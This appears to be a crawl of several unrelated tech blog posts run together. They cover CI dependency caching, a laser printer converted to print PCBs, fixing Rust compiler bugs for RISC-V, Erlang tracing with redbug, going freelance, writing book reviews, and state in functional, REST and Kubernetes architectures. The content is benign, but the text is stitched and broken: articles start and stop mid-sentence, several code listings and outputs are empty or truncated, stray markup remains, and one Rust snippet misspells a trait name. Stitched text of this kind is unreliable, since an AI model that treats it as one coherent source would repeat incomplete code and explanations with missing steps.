It could take almost 2 minutes to store our dependencies in the workspace, and that step needed to complete before we started our jest job.</p><p>To get around this problem, we changed the way we split our jobs. We divided them into first-level jobs that can rely on the global cache for dependencies (and don’t depend on the completion of other jobs) and everything else. Then we added a new first-level job, <code>cache-deps</code>, that cached all dependencies for any job that ran after the first level.</p><p>Our new pipeline runs all first-level jobs immediately, and then anything with a dependency. This division has the added benefit that most of our first-level jobs no longer need to write out to the cache, as <code>cache-deps</code> now takes care of that.</p><p>In our config, this looks like:</p><div><pre><p><span>1</span><span>jobs:</span></p><p><span>2</span><span></span><span>+  cache-deps:</span><span></span></p><p><span>3</span><span></span><span>+    parameters:</span><span></span></p><p><span>4</span><span></span><span>+      key:</span><span></span></p><p><span>5</span><span></span><span>+        type: string</span><span></span></p><p><span>6</span><span></span><span>+    executor: ci-node</span><span></span></p><p><span>7</span><span></span><span>+    steps:</span><span></span></p><p><span>8</span><span></span><span>+      - git-shallow-clone/checkout</span><span></span></p><p><span>9</span><span></span><span>+      - restore_cache:</span><span></span></p><p><span>10</span><span></span><span>+          keys:</span><span></span></p><p><span>11</span><span></span><span>+            - &lt;&lt; parameters.key &gt;&gt;</span><span></span></p><p><span>12</span><span></span><span>+      - run: yarn install</span><span></span></p><p><span>13</span><span></span><span>+      - save_cache:</span><span></span></p><p><span>14</span><span></span><span>+          paths:</span><span></span></p><p><span>15</span><span></span><span>+            - node_modules</span><span></span></p><p><span>16</span><span></span><span>+            - packages/admin-dashboard/node_modules</span><span></span></p><p><span>17</span><span></span><span>+            - packages/core/node_modules</span><span></span></p><p><span>18</span><span></span><span>+            - ...</span><span></span></p><p><span>19</span><span></span><span>+      …</span></p></pre></div></div></article></div>

<p>In many locations you can get PCBs made fast, cheap, and of very good quality. In Brazil, where Vítor Barbosa lives, this isn’t the case, so he built a&nbsp;“<a href="https://hackaday.io/project/171775-haxmark460-home-pcb-printer">haxmark460</a>” PCB printer&nbsp;to help manufacture circuits at home.</p>
<p> The build modifies a Lexmark E460dn laserjet printer to mark PCBs directly, using an aluminum carrier plate instead of its normal paper feed operation.</p>
<p>An Arduino is utilized to hijack and output printer signals, enabling it to it to work in a much different way than how it was originally designed. The carrier plate, with blank PCB material taped on, is fed into the front and the PCB is pulled through and properly marked by the printer. After a dip in acetone to allow the toner to stick to the copper, the board is ready to etch!</p>

          <p>My
<a href="https://www.codethink.co.uk/articles/2020/improving-risc-v-linux-support-in-rust/">previous blog post</a>
introduced my work to improve <a href="https://www.rust-lang.org/">Rust's</a> support for
<a href="https://riscv.org/">RISC-V</a> Linux systems. Since then I fixed a couple of
interesting compiler bugs. This blog post is more technical - describing these
bugs and explaining some <code>rustc</code> internals along the way. I conclude by
reporting on movement in the broader Rust community regarding RISC-V. I
assumed that the reader is comfortable with programming terminology. This blog
post contains Rust code samples but the reader is not expected to be fluent in
Rust.</p>
<h2>Hanging Tests</h2>
<p>In the last blog post I mentioned an issue where some <code>rustc</code> tests would
hang indefinitely. While I was tracking down the problem, the upstream
Rust project
<a href="https://github.com/rust-lang/rust/pull/67759">upgraded from LLVM 9 to LLVM 10</a>,
which fixed the hanging tests. I did not look into this issue
further.</p>
<h3>What is LLVM anyway?</h3>
<p>Modern compilers do not translate directly from source code into machine code.
Source code is intended to be convenient for humans to read; but it often is not
convenient for a compiler to reason about. Instead, compilers transform source
code through one (or more) intermediate representations on its way to becoming
machine code. <code>rustc</code> compiles Rust source through intermediate
representations into LLVM Intermediate Representation<a href="#first">*</a> (LLVM IR).
LLVM then runs optimisation passes on the LLVM IR and finally generates machine
code for the chosen architecture.</p>
<p>I think of LLVM IR as an elaborated machine-independent<a href="#second">**</a>
typed assembly language with unlimited registers. See this LLVM IR for a function
to add integers:</p>
<p><code>add.rs</code></p>
<div><pre><span></span><span>pub</span><span> </span><span>fn</span> <span>add</span><span>(</span><span>x</span>: <span>i32</span><span>,</span><span> </span><span>y</span>: <span>i32</span><span>)</span><span> </span>-&gt; <span>i32</span> <span>{</span><span></span>
<span>    </span><span>x</span><span> </span><span>+</span><span> </span><span>y</span><span></span>
<span>}</span><span></span>
</pre></div>


<p><code>rustc --crate-type lib -O add.rs --emit llvm-ir</code></p>
<div><pre><span></span>; ModuleID = 'add.3a1fbbbh-cgu.0'
source_filename = "add.3a1fbbbh-cgu.0"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

; add::add
; Function Attrs: norecurse nounwind nonlazybind readnone uwtable
define i32 @_ZN3add3add17h7cc3d194e9d7e4cdE(i32 %x, i32 %y) unnamed_addr #0 {
start:
  %0 = add i32 %y, %x
  ret i32 %0
}

attributes #0 = { norecurse nounwind nonlazybind readnone uwtable "probe-stack"="__rust_probestack" "target-cpu"="x86-64" }

!llvm.module.flags = !{!0, !1}

!0 = !{i32 7, !"PIC Level", i32 2}
!1 = !{i32 2, !"RtLibUseGOT", i32 1}
</pre></div>


<p>In LLVM IR, lines starting with <code>;</code> are comments. <code>target datalayout</code> and
<code>target triple</code> tell LLVM what architecture it should generate code for.</p>
<p>Next is the function definition. In Rust, the function name is <code>add::add</code>;
but the compiler mangles the name to <code>_ZN3add3add17h7cc3d194e9d7e4cdE</code>.
Then <code>define i32 @foo(i32 %x, i32 %y)</code> means <em>"define a function called
<code>foo</code> which takes two 32-bit signed integer (<code>i32</code>) arguments and returns an
<code>i32</code>"</em>. Inside the function, a <code>start:</code> label begins the block;
then <code>%0 = add i32 %y, %x</code> performs signed 32-bit addition on <code>x</code> and <code>y</code>
and puts the result in a variable automatically named <code>0</code>. Finally, <code>ret i32 %0</code>
returns the value of <code>0</code> as an <code>i32</code>.</p>
<p>The <code>attributes #0</code> line provides extra annotations for all functions tagged
with <code>#0</code> (such as <code>add::add</code>). The annotations give hints for LLVM optimisation
passes.</p>
<p>In theory, to support a new target architecture <code>rustc</code> only needs to know how to
tell LLVM that it should generate code for that architecture. <code>rustc</code> can then
generate LLVM IR as usual and LLVM will handle everything specific to the
architecture. For example, see the tiny
<a href="https://github.com/rust-lang/rust/pull/66661">PR</a> which initially added the
RISC-V Linux target.</p>
<p>In practice, <code>rustc</code> also needs to know how to conform to the ABI for the target
so that the generated code is interoperable with other programming languages. The
RISC-V ABI was added separately.</p>
<p><a name="first">*</a> <em>As well as LLVM, <code>rustc</code> also has an experimental
<a href="https://github.com/bjorn3/rustc_codegen_cranelift">cranelift backend</a>.</em></p>
<p><a name="second">**</a> <em>LLVM IR can be ABI specific but is not machine specific.</em></p>
<h2>Code generation Test Failure</h2>
<p>Other than fixing the hanging <code>ui</code> tests, LLVM 10 also broke code generation
tests for RISC-V. In LLVM 9 IR, function
arguments weren't always named but
<a href="https://github.com/llvm/llvm-project/commit/a009a60a917bc30940422bcef73f8270566d78db">in LLVM 10 they are</a>
. This change broke <code>rustc</code> code generation tests which look for specific strings
in the LLVM IR output by <code>rustc</code>.</p>
<p>After narrowing this test failure down to the LLVM 10 upgrade, I found the
relevant change by looking at <code>clang</code> (which also uses LLVM) tests for the RISC-V
ABI. The
<a href="https://github.com/rust-lang/rust/commit/c872dcf956e541315985ee5fdc592907c20df8ec">fix</a>
was as simple as copying the clang test changes and adapting them for <code>rustc</code>'s
tests.</p>
<h2>UI Tests</h2>
<p>The <code>ui</code> tests for <code>rustc</code> check all user facing aspects of the compiler. Some of
these tests check that <code>rustc</code> displays the correct error messages when compiling
erroneous source.</p>
<p>There was a bug highlighted by some of these tests on RISC-V: <code>rustc</code> displays
the correct errors but in the wrong order! To debug this I used
<code>-Z treat-err-as-bug=n</code> to cause <code>rustc</code> to panic on the <code>n</code>th error. The panic
backtrace shows where the error is generated from. In this case, the miss-ordered
errors came from
<a href="https://github.com/rust-lang/rust/blob/master/src/librustc_resolve/late.rs#L1287"><code>src/librustc_resolve/late.rs</code></a>:</p>

<p>In part 3, <code>missing_vars</code> is sorted before the errors are reported so how can
the errors be out of order?</p>
<p>At the time of the sort, <code>missing_vars</code> is a <code>Vec</code>tor of tuples, with each tuple
containing a <code>Symbol</code> and a mutable reference to a <code>BindingError</code>. In Rust this
type is written as <code>Vec&lt;(Symbol, &amp;mut BindingError)&gt;</code>. Rust tuples sort first by
the left-most element (in this case, the <code>Symbol</code>). To explain <code>Symbol</code> ordering
following a sort, first we must look at how strings are used within <code>rustc</code>.</p>
<h3>String Interning</h3>
<p>Source code often contains duplicates of the same string token. For example,
in the above listing of <code>check_consistent_bindings</code> the string <code>"FxHashMap"</code>
occurs twice and <code>"missing_vars"</code> occurs five times. Allocating separate strings
for each of these occurrences would waste memory and time. Instead, <code>rustc</code>
allocates each string once and uses indices to refer to the full string each
time it is needed. These indices are 32-bit unsigned integers (in a wrapper
type) and so can be copied and compared efficiently. The process of allocating
a string only once and using references to that string is called "interning".</p>
<p><a href="https://github.com/rust-lang/rust/blob/master/src/librustc_span/symbol.rs#L1041"><code>Symbol</code></a>
is the type representing an interned string:</p>
<div><pre><span></span><span>#[derive(Clone, Copy, PartialEq, ParitialOrd, Hash)]</span><span></span>
<span>pub</span><span> </span><span>struct</span> <span>Symbol</span><span>(</span><span>SymbolIndex</span><span>);</span><span></span>
</pre></div>


<p>Here we can see that the implementation of <code>PartialOrd</code> for <code>Symbol</code> (which
provides the <code>Ord</code>ering of <code>Vec::sort</code> above) derives from the index's <code>Ord</code>ering.
But where does the index come from?</p>

<p><code>rustc</code> interns strings using <code>Interner::intern</code>, which
returns a <code>Symbol</code>. References to the interned strings are stored in a
<code>Vec</code>tor and the <code>Symbol</code> contains the index of the string reference in that
<code>Vec</code>tor. Therefore, the Symbol can look up its string by indexing into the
<code>strings</code> vector and following the reference (pointer) to the actual string
(which is allocated in the <code>arena</code>).</p>
<p>For example, if the strings <code>"a"</code>, <code>"b"</code> and <code>"c"</code> are interned, then (ignoring
the referencing), the <code>Interner</code>'s <code>Vec</code> will look like <code>["a", "b", "c"]</code>. If
instead we interned <code>"b"</code>, <code>"a"</code>, <code>"b"</code> and <code>"c"</code>; the <code>Vec</code> will look like
<code>["b", "a", "c"]</code> because the second attempt to intern <code>"b"</code> finds that <code>"b"</code> is
already interned and so just returns the index of the existing copy of <code>"b"</code>.
Carrying on with this second example, imagine the following:</p>
<div><pre><span></span><span>let</span><span> </span><span>mischief</span><span> </span><span>=</span><span> </span><span>Symbol</span>::<span>intern</span><span>(</span><span>"b"</span><span>);</span><span></span>
<span>let</span><span> </span><span>a</span><span> </span><span>=</span><span> </span><span>Symbol</span>::<span>intern</span><span>(</span><span>"a"</span><span>);</span><span></span>
<span>let</span><span> </span><span>b</span><span> </span><span>=</span><span> </span><span>Symbol</span>::<span>intern</span><span>(</span><span>"b"</span><span>);</span><span></span>
<span>let</span><span> </span><span>c</span><span> </span><span>=</span><span> </span><span>Symbol</span>::<span>intern</span><span>(</span><span>"c"</span><span>);</span><span></span>

<span>let</span><span> </span><span>mut</span><span> </span><span>v</span><span> </span><span>=</span><span> </span><span>vec</span><span>!</span><span>[</span><span>c</span><span>,</span><span> </span><span>b</span><span>,</span><span> </span><span>a</span><span>];</span><span></span>
<span>v</span><span>.</span><span>sort</span><span>();</span><span></span>
</pre></div>


<p>While we might expect <code>v</code> to end up equal to <code>[a, b, c]</code>, <code>v</code> is actually sorted
to equal <code>[b, a, c]</code> because <code>Symbol</code>s are sorted by their indices not by the
strings they point to. <code>b</code> received the lowest index because it was interned
first. This semantic can be useful because the index ordering is faster than
looking up the full strings and comparing them; and …</p></div></div></div>

</div><p>Let’s now look at the actual message produced by redbug. By default
messages are printed to the standard output, but it’s also possible to
dump them to file:</p><div>
<div>
<pre><code data-lang="erlang"><span>% 15:20:20 &lt;0.31.0&gt;({erlang,apply,2})
</span><span>%</span> <span>lists</span><span>:</span><span>sort</span><span>([</span><span>3</span><span>,</span><span>2</span><span>,</span><span>1</span><span>])</span></code></pre>
</div>
</div><p>Depending on the version of redbug you are using, you may get a
slightly different message. In this case, the message is split across
two lines. The first line contains a <strong>timestamp</strong>, the <strong>Process Identifier</strong>
(or <em>PID</em>) of the Erlang process which invoked the function and the
<strong>caller</strong> function. The second line contains the function called,
including the input arguments. Both lines are prepended with a <code>%</code>,
which reminds us of the syntax for Erlang comments.</p><p>We can also ask Redbug to produce an extra message for the return
value. This is achieved using the following syntax:</p><div>
<div>
<pre><code data-lang="erlang"><span>4</span><span>&gt;</span> <span>redbug</span><span>:</span><span>start</span><span>(</span><span>"lists:sort/1-&gt;return"</span><span>).</span>
<span>{</span><span>30</span><span>,</span><span>1</span><span>}</span></code></pre>
</div>
</div><p>Let’s invoke the <code>lists:sort/1</code> function again. This time the output
from redbug is slightly different.</p><div>
<div>
<pre><code data-lang="erlang"><span>5</span><span>&gt;</span> <span>lists</span><span>:</span><span>sort</span><span>([</span><span>3</span><span>,</span><span>2</span><span>,</span><span>1</span><span>]).</span>

</div>
</div><p>In this case two messages are produced, one when entering the function
and one when leaving the same function.</p><p>When dealing with real code, trace messages can be complex and
therefore hardly readable. Let’s see what happens if we try to trace
the sorting of a list containing 10.000 elements.</p><div>

</div>
</div><p>Most of the output has been truncated here, but you should get the
idea. To improve things, we can use a couple of redbug options.  The
option <code>{arity, true}</code> instructs redbug to only display the number of
input arguments for the given function, instead of their actual
value. The <code>{print_return, false}</code> option tells Redbug not to display
the return value of the function call, and to display a <code>…​</code>  symbol,
instead. Let’s see these options in action.</p><div>

</div><p>By default, redbug stops after 15 seconds or after 10 messages are
received. Those values are a safe default, but they are rarely
enough. You can bump those limits by using the <code>time</code> and <code>msgs</code>
options. <code>time</code> is expressed in milliseconds.</p><div>

</div>
</div><p>We can also activate redbug for several function calls
simultaneously. Let’s enable tracing for both functions <code>lists:sort/1</code>
and <code>lists:sort_1/3</code> (an internal function used by the former):</p><div>

</span><span>redbug</span> <span>done</span><span>,</span> <span>timeout</span> <span>-</span> <span>2</span></code></pre>
</div>
</div><p>Last but not least, redbug offers the ability to only display results
for matching input arguments. This is when the syntax looks a bit like
magic.</p><div>
<div>
<pre><code data-lang="erlang"><span>12</span><span>&gt;</span> <span>redbug</span><span>:</span><span>start</span><span>([</span><span>"lists:sort([1,2,5])-&gt;return"</span><span>]).</span>

</span><span>redbug</span> <span>done</span><span>,</span> <span>timeout</span> <span>-</span> <span>1</span></code></pre>
</div>
</div><p>In the above example, we are telling redbug that we are only
interested in function calls to the <code>lists:sort/1</code> function when the
input arguments is the list <code>[1,2,5]</code>. This allows us to remove a huge
amount of noise in the case our target function is used by many actors
at the same time and we are only interested in a specific use case.
Oh, and don’t forget that you can use the underscore as a wildcard:</p><div>
<div>
<pre><code data-lang="erlang"><span>15</span><span>&gt;</span> <span>redbug</span><span>:</span><span>start</span><span>([</span><span>"lists:sort([1,_,5])-&gt;return"</span><span>]).</span>  <span>{</span><span>30</span><span>,</span><span>1</span><span>}</span>

July 2, 2020 | https://sarfas.codes/blog/from-employee-to-contractor-my-experience | <a href="https://web.archive.org/web/*/https://sarfas.codes/blog/from-employee-to-contractor-my-experience">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div v-pre="">
        <p>I've been offline (blog wise) for nearly 3 months now - <a href="https://sarfas.codes/blog/laravel-route-model-binding/">in fact my last post was on April 12th!</a>.</p>
<p>A lot of that has come down to me moving house, COVID-19 messing with my working schedule, and some other things I've been working out in the background. The main thing that's changed here is; <strong>I'm now self-employed</strong></p>

<p>Having taken on some large projects at my main job, I had to cut back on my side-projects and contracting work in the evenings. This was to keep me from burning out as I was working too much.</p>
<p>Fast forward to Coronavirus days, and I found myself missing the contracting work. I loved working from home, and being able to structure the freelance hours around my own schedule. So I decided I was going to take this on full time, and pack in my dayjob.</p>
<p>I left my last PAYE ("normal job") role 3 weeks ago now, and have been working full time on <a href="https://cleveregg.io/">CleverEgg Digital</a> with a close group of clients.</p>

<p>For me, the main positive is controlling my own hours.</p>
<p>If I want to take a day off - I just do it. Yes, I'm not earning money that day, so I need to catch it up; but the option is there if I need it. There's no HR process, no holiday bookings, nothing. I take a day, when I like.</p>
<p>The hours. I'm most efficient after midday. Due to this, most of my contract work is done between the hours of 11am and 7pm. This gives me the freedom to do whatever I like in the mornings, and still have a late night if I like - I don't have to get up for work early ⏰</p>

<p><strong>Time Management</strong></p>
<p>If you're considering doing this, you need to be your own worst critic and be strict on your time. Time is literally money in the contracting world.</p>
<p>You don't have a boss staring down you 24/7. Or checking up on your progress everyday. If you wanna earn some money, do it off your own back.</p>
<p>Once you get a few clients, the thought of invoices being settled will be a good motivator - so that's always a bonus.</p>
<p>I've found that working for yourself means you do need to know a little more than just "your trade". Here's a few I can mention off the top of my head;</p>
<ul>
<li>Basic Accounting,</li>
<li>Fundamentals of understanding Contracts, Terms, and negotiation thereof,</li>
<li>Marketing &amp; pricing</li>
</ul>
<p>I'm a developer by trade, yet I've had to use all of the above 3 in the last 24 hours. Naturally I could pay someone to do all of them; but I'm not in any financial position to do so.</p>

<p>I should have done this sooner! I'm far happier in my work, as well as in a better position with my mental health.</p>
<p>I thought I'd be working longer hours to chase the extra money - given I can do so. However, I actually work less than I did with my "standard job"; and I'm no worse off financially.</p>

<p>Freelance/Contracting isn't for everyone. Clients are very hard to come by, especially in today's economy and situations. I've been extremely lucky in that I've found a handful of clients who are well backed financially, and are unaffected by the pandemic.</p>
<p>I cannot express how much I owe of this to the <a href="https://laravelphp.uk/">LaravelUK</a> community. Both in sourcing/sharing clients, and giving me support and advice for the last 2 years whilst I ponder over this decision.</p>
<p>If you do take the plunge and go into this chaos, here's a few tips;</p>
<ul>
<li>Find a community of like-minded people within your industry</li>
<li>Ensure that you have enough money that you can go without work for a bit
<ul>
<li><em>You won't be getting sick pay, or Annual Leave</em></li>
</ul></li>
<li>Don't under charge. Cheaper clients are cheap for a reason. Those that want your time, respect your trade, and want to look after you will pay for it.</li>
<li>Be confident in your work; but not complacent / arrogant</li>
<li><strong>Enjoy it. Being your own boss is awesome!</strong></li>
</ul>    </div></div>]]>

</blockquote>

<p>With the coronavirus shortening my work commute into a walk down the hall, I’ve been able to read more in the mornings. Now that I’ve been gifted more time in the day, I am finishing about a book a week (I’m privileged to have at least an hour a day for reading, and that time quickly adds up). It has been amazing to return to my teenage reading habits when my parents feigned exasperation at my perpetual nose-in-book lifestyle - “is that kid reading again?”. In these tumultuous times, books have also been a welcome respite (well-documented positive effects of reading on mental well-being probably don’t hurt).</p>

<p>Reading more, I couldn’t help but notice book reviews everywhere. Inspired, I wrote <a href="https://www.micahlerner.com/books/2020-05-30-solaris.html">a</a> <a href="https://www.micahlerner.com/books/2020-05-21-the-man-who-solved-the-market-how-jim-simons-launched-the-quant-revolution.html">few</a>, but found myself asking what I wanted to get out of the creative energy I was channeling into them (after all, I’m not a professional book-review-writer and my time is limited). In order to think clearly about the topic, I sought inspiration in the work of other writers.</p>

<h2 id="how-do-other-writers-approach-book-reviews">How do other writers approach book reviews?</h2>

<p>With the question “how should I write about what I’ve been reading?” in mind, I started compiling examples of book reviews and categorizing them by style:</p>

<ul>
  <li><strong>Persuasive reviews</strong>: I bucket reviews <a href="https://www.nytimes.com/2019/09/16/books/review-night-boat-tangier-kevin-barry.html">like those</a> from the NYTimes into this category. Even though the author of the inevitably informs you about the book’s content, they’re advocating that their readers purchase the book (or don’t purchase the book in some case). Frequently the review also gives a background on the book’s literary lineage.</li>
  <li><strong>Summary reviews</strong>: Products like <a href="https://www.blinkist.com/en/nc/library/">Blinkist</a> or <a href="https://www.nateliason.com/notes/antifragile">Nat Eliason’s book reviews</a> fall into this category. I think there’s a place for summarization-style reviews of non-fiction <a href="https://commoncog.com/blog/the-3-kinds-of-non-fiction-book/#branchbooks">“branch books”</a> - if one were to imagine knowledge as a tree, “branch books” typically cover a single topic on the edge of the tree, rather than attempting to be a wide-reaching, foundational tome of a subject area.</li>
  <li><strong>Thematic reviews</strong>: The New York Review of Books <a href="https://www.nybooks.com/articles/2020/07/02/what-is-college-worth/">often</a> <a href="https://www.nybooks.com/articles/2019/11/07/heritage-of-evil/">combines</a> discussion of several books into a general overview of a topic. This approach is well-suited to academics or subject-matter experts who have the time (and intellectual stamina!) to read a variety of books connected to a common thread.</li>
  <li><strong>Deep-dive reviews:</strong> Slate Star Codex was (while I was writing this, the takedown of the blog happened) an <a href="https://slatestarcodex.com/2020/03/17/book-review-hoover/">example</a> of this category, with <a href="https://slatestarcodex.com/2020/06/01/book-review-origin-of-consciousness-in-the-breakdown-of-the-bicameral-mind/">opinionated book reviews</a> that form connections between the author’s well-formed thoughts and the subject matter at hand. They’re often witty and summarize the content as needed while weaving it into a story.</li>
</ul>

<p>With a general overview of possible styles loaded into my memory, I switched to thinking about what I was hoping to get out of the process.</p>

<h2 id="what-do-i-want-to-get-out-of-book-reviews">What do I want to get out of book reviews?</h2>

<p>After consuming diverse, different review styles, I realized that I could reduce my motivation for reviewing books to two goals: retention of what I learned (in the case of non-fiction) books and writing something other people enjoy reading.</p>

<p>Thankfully there is a large body of knowledge about how to accomplish the first goal using <a href="https://www.gwern.net/Spaced-repetition">spaced repetition</a>.</p>

<p>Spaced repetition is also called SRS, and there are many sources about how to use the system to increase retention:</p>
<ul>
  <li><a href="https://robertheaton.com/">Rob Heaton’s</a> blog post on <a href="https://robertheaton.com/2018/06/25/how-to-read/">How to read</a></li>
  <li><a href="http://augmentingcognition.com/ltm.html">Augmenting long term memory</a> discusses using Anki for deep reviews</li>
  <li>A (sic) Hahvahd Business Review <a href="https://hbr.org/2016/02/how-to-read-a-book-a-week">article</a> about retention and understanding</li>
</ul>

<p>Unfortunately, making book reviews enjoyable for other people is a more difficult problem, and the best path is being inspired by others. If you find a great review <a href="https://www.micahlerner.com/2020/06/13/micah.lerner@hey.com">send it my way</a>!</p>

While statelessness has a lot of benefits, it’s unfortunately rarely possible in the real world. In this post, I’d like to detail this stance of mine a bit.</p> <div> <h2 id="state-in-functional-programming">State in Functional Programming</h2> <div> <p>Functional Programming is based on a set of principles. Among those principles are <em>pure</em> functions:</p> <div> <blockquote> <p>A pure function is a function that has the following properties:</p> <ol><li><span>Its return value is the same for the same arguments</span></li><li><span>Its evaluation has no side effects</span></li></ol> </blockquote>  </div> <p>For example, the following function is <em>pure</em>:</p> <div> <div> <pre><code data-lang="java"><span>int</span> <span>timesTwo</span><span>(</span><span>int</span> <span>value</span><span>)</span> <span>{</span>
    <span>return</span> <span>value</span> <span>*</span> <span>2</span><span>;</span>
<span>}</span></code></pre> </div> </div> <p>A <em>pure</em> function allows <em>referential transparency</em>: the swapping of then function with its return value. With that in mind, the introduction of state may defeat the previous definition. For example, the following breaks <em>referential transparency</em>:</p> <div> <div> <pre><code data-lang="java"><span>class</span> <span>Multiplier</span> <span>{</span>

  <span>private</span> <span>int</span> <span>factor</span> <span>=</span> <span>1</span><span>;</span>

  <span>public</span> <span>int</span> <span>times</span><span>(</span><span>int</span> <span>value</span><span>)</span> <span>{</span>
    <span>return</span> <span>value</span> <span>*</span> <span>factor</span><span>;</span>
  <span>}</span>

  <span>public</span> <span>void</span> <span>setFactor</span><span>(</span><span>int</span> <span>factor</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span><span>factor</span> <span>=</span> <span>factor</span><span>;</span>
  <span>}</span>
<span>}</span></code></pre> </div> </div> <p>Successive calls to <code>times()</code> with the same argument may return different results because the <code>setFactor()</code> method may have changed the <code>factor</code> attribute’s value between calls. Interestingly enough, a method can conform to the <em>referential transparency</em> property, but still break the no side-effects property. Here’s an example:</p> <div> <div> <pre><code data-lang="java"><span>class</span> <span>MemoizedMultiplier</span> <span>{</span>

  <span>private</span> <span>final</span> <span>int</span> <span>factor</span><span>;</span>
  <span>private</span> <span>final</span> <span>Map</span><span>&lt;</span><span>Integer</span><span>,</span> <span>Integer</span><span>&gt;</span> <span>results</span> <span>=</span> <span>new</span> <span>HashMap</span><span>&lt;&gt;();</span>

  <span>public</span> <span>MemoizedMultiplier</span><span>(</span><span>int</span> <span>factor</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span><span>factor</span> <span>=</span> <span>factor</span><span>;</span>
  <span>}</span>

  <span>public</span> <span>int</span> <span>times</span><span>(</span><span>int</span> <span>value</span><span>)</span> <span>{</span>
    <span>int</span> <span>cache</span> <span>=</span> <span>results</span><span>.</span><span>get</span><span>(</span><span>value</span><span>);</span>
    <span>if</span> <span>(</span><span>cache</span> <span>==</span> <span>null</span><span>)</span> <span>{</span>
      <span>int</span> <span>result</span> <span>=</span> <span>value</span> <span>*</span> <span>factor</span><span>;</span>
      <span>results</span><span>.</span><span>put</span><span>(</span><span>value</span><span>,</span> <span>result</span><span>);</span>
      <span>return</span> <span>result</span><span>;</span>
    <span>}</span> <span>else</span> <span>{</span>
      <span>return</span> <span>cache</span><span>;</span>
    <span>}</span>
  <span>}</span>
<span>}</span></code></pre> </div> </div> <p>The above implementation is <em>immutable</em>: state is set once when the object is created, and cannot be changed afterwards. Successive calls with the same argument will return the same result over and over. Yet, the method has side-effects.</p> <p>To keep most of the system <em>pure</em>, practitioners of <abbr title="Functional Programming">FP</abbr> push non-pure functions to the system boundaries.</p> </div> </div> <div> <h2 id="state-in-web-architectures">State in web architectures</h2> <div> <p>The HTTP protocol is stateless. The benefit is obvious: when a request hits the load-balancer, the latter can forward it to any web server that belongs to the cluster, and that hosts the requested resource. This allows for <a href="https://en.wikipedia.org/wiki/Scalability#Horizontal_or_Scale_Out" target="_blank" rel="noopener">horizontal scaling</a>. When the load increases, it’s straightforward to add more nodes until the performance becomes acceptable again. It works like a charm, until the requirement goes beyond just displaying static pages.</p> <p>In reality, a lot of use-cases require different HTTP requests to be recognized as originating from the same "session": authentication, e-commerce caddies, etc. <a href="https://en.wikipedia.org/wiki/HTTP_cookie" target="_blank" rel="noopener">Cookies</a> are the browsers' answer to those requirements.</p> <p>Servers do offer a generic storage mechanism, keyed to a session identifier. On the first request, the server adds a cookie with a specific session id to the response. Subsequent requests will use this cookie, so the server associates the request with the same session. Different servers have different cookies: <code>JSESSIONID</code> for Java EE, <code>PHPSESSID</code> for PHP, <code>ASPSESSIONID</code> for ASP, etc.</p> <p>Data stored on a specific cluster node won’t obviously be accessible to requests forwarded to other nodes, even when they originate from the same session. To avoid that, sessions needs to be "pinned down" on the node that received the first request for that session. In standard web architectures, this is one of the responsibility of the load-balancer: it keeps the association between a session id and the node in memory. This feature is known as <em>sticky sessions</em>.</p> <p>However, nodes will sometimes fail. If session data is on that node, it will be lost. To compensate for that, data needs to be replicated on other nodes. That capability is known as <em>session replication</em>.</p> <p>Sticky sessions, and even more so sessions replication, make architectures stateful.</p> </div> </div> <div> <h2 id="state-in-rest-architectures">State in REST architectures</h2> <div>  <ol><li><span>Client-server architecture</span></li><li><span>Statelessness</span></li><li><span>Cacheability</span></li><li><span>Layered system</span></li><li><span>Uniform interface</span></li></ol> <p>Note that #2 explicitly defines <a href="https://en.wikipedia.org/wiki/Representational_state_transfer#Statelessness" target="_blank" rel="noopener">statelessness</a> as a requirement of the REST architecture. However, the definition of it in this context is not the absence of state, but that state shouldn’t be stored server-side.</p> <div> <blockquote> <p>The client-server communication is constrained by no client context being stored on the server between requests. Each request from any client contains all the information necessary to service the request, and the session state is held in the client. The session state can be transferred by the server to another service such as a database to maintain a persistent state for a period and allow authentication.</p> </blockquote> </div> <p>The quote above defines two options to store data:</p> <div> <dl> <dt>In a database</dt> <dd> <p>Storing data is the <em>raison d’être</em> for databases, whether SQL or NoSQL. Hence, it seems like an obvious choice to store state. However, this generally implies <em>disk-based persistence</em>. In turn, this means increased access time to data, 2 or 3 orders of magnitude higher than for in-memory access.</p> </dd> <dt>On the client</dt> <dd> <p>Another option is to store data as cookies. This approach raises some interesting challenges on its own: the first one is about security. If credentials-related data is stored client-side, then how can the server guarantees they are genuine? The currently agreed-upon answer is <a href="https://jwt.io/" target="_blank" rel="noopener">JSON Web Tokens</a>. One just needs to remember it makes the flow more complex, and slower, because validation still needs to occur server-side, prior to any further request handling.</p> <p>The second challenge revolves around data serialization. Simple types <em>e.g.</em> <code>int</code> or <code>String</code> can easily be set in cookie values, but what about more complex types? It would require an serialization/deserialization mechanism: when the request is received, cookies should be deserialized into objects, and when the response is sent, objects should be serialized back into a compatible format <em>e.g.</em> JSON.</p> <p>The complete setup is worth a dedicated post, but here are some points that deserve some attention:</p> <ul><li><span>How to manage serialization limitations?</span></li><li><span>The need to automate the serialization/deserialization flow</span></li><li><span>Configure the entities to be serialized, and decide which JSON library to use</span></li></ul> </dd> </dl> </div> </div> </div> <div> <h2 id="state-in-kubernetes">State in Kubernetes</h2> <div> <p>First, one should remember that Kubernetes was originally focused on stateless workloads. For example, <code>StatefulSet</code> was introduced in version 1.5 as a beta feature. Furthermore, rolling upgrades of the <code>Deployment</code> object handle pods only. If containerized applications use a database, and software require different schema versions, you’re on your own: while possible, <a href="https://www.youtube.com/watch?v=RvCnrBZ0DPY" target="_blank" rel="noopener">it’s not trivial</a>.</p> <p>Apart from that, Kubernetes offers some interesting options to manage state:</p> <div> <dl> <dt>Inside the container</dt> <dd> <p>The easiest way to store data is to use the container’s topmost layer. This is the case when one uses one of the filesystem unmapped directories <em>e.g.</em> <code>/var/log</code>. This option has a big flaw: when the container is stopped, whether abnormally or not, data is lost.</p> </dd> <dt>In an attached volume</dt> <dd> <p><a href="https://kubernetes.io/docs/concepts/storage/volumes/" target="_blank" rel="noopener">Volumes</a> are the nominal way to store data across pod stops. There is a lot whole different kinds of volumes available:</p> <ul><li><span>Volumes can be mounted on the host</span></li><li><span>They can be as well on <abbr title="Network File System">NFS</abbr></span></li><li><span>There is one kind for each common Cloud provider: Google Cloud, Azure, and AWS</span></li><li><span>Empty volumes allow to share data between pods</span></li><li><span>etc.</span></li></ul> </dd> </dl> </div> <p>Note that even with volumes, there’s no 100% durability 